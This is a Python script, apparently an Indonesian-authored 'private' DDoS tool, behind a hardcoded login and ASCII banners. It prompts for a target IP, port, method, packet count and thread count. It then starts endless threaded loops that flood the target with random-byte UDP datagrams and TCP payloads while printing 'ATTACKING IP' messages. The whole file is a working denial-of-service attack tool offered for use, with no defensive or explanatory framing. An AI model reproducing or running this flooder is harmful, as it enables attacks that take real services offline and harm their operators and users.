#TOOL BY DEAXS
import os
import codecs
import sys
import random
import threading
import time
import socket
from time import time as tt

os.system("clear")


print("""
\033[0;32m _                         
\033[0;32m( )                _       
\033[0;32m| |      _     __ (_) ___  
\033[0;32m| |  _ / _ \ / _  \ |  _  \\
\033[0;32m| |_( ) (_) ) (_) | | ( ) |
\033[0;32m(____/ \___/ \__  |_)_) (_)
\033[0;32m            ( )_) |        
\033[0;32m             \___/         
""")

username = str(input("Username:"))
password = str(input("Password:"))
if password == "DerZ" and username == "DerZ":
    print ("Telah Masuk Sebagai DeaXs")
    time.sleep(0.2)

else:
    print ("Passwordnya Salah Bruh.")
    time.sleep(999999999999999999999999999)
    
os.system("clear")
print("\033[92mConnecting To Server [\033[97m•\033[92m]")
time.sleep(0.5)


nicknm = "DeaXS"

mt = """\033[96mUnder \033[0;93mmaintance"""

os.system("clear")

print("""\033[95m

██████╗░███████╗░█████╗░██╗░░██╗░██████╗
██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝██╔════╝
██║░░██║█████╗░░███████║░╚███╔╝░╚█████╗░
██║░░██║██╔══╝░░██╔══██║░██╔██╗░░╚═══██╗
██████╔╝███████╗██║░░██║██╔╝╚██╗██████╔╝
╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░""")

print("\033[95m>> CODED : DerZ. ") 
print("\033[95m>>> Coded Campuran By : DerZ") 
print("\033[95m>>>> TOOLS PRIVATE DERZ")
print("\033[91m                                       METODE: UDP-TCP-GET-OVH              ")
ip = str(input("  \033[0;31mIP:"))
port = int(input(" \033[0;32mPort:"))
choice = str(input(" \033[94mMethods: "))
times = int(input(" \033[0;31mPacket:"))
threads = int(input(" \033[0;32mThreads:"))
os.system("clear")
time.sleep(0.1)

def ddos():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\u001b[31m ZIELX ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			print("\u001b[31m[×] ZIELX ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def ddos2():
	data = random._urandom(1025)
	i = random.choice(("[-]","[•]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ZIELX ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[×] ZIELX ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


def ddos3():
	data = random._urandom(1025)
	i = random.choice(("[-]","[•]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ZIELXXX ATTACKING TO\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[×] ZIELX ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))


for y in range(threads):
	if choice == 'ready':
		th = threading.Thread(target = ddos)
		th.start()
		th = threading.Thread(target = ddos2)
		th.start()
	else:
	    th = threading.Thread(target = ddos3)
	    th.start()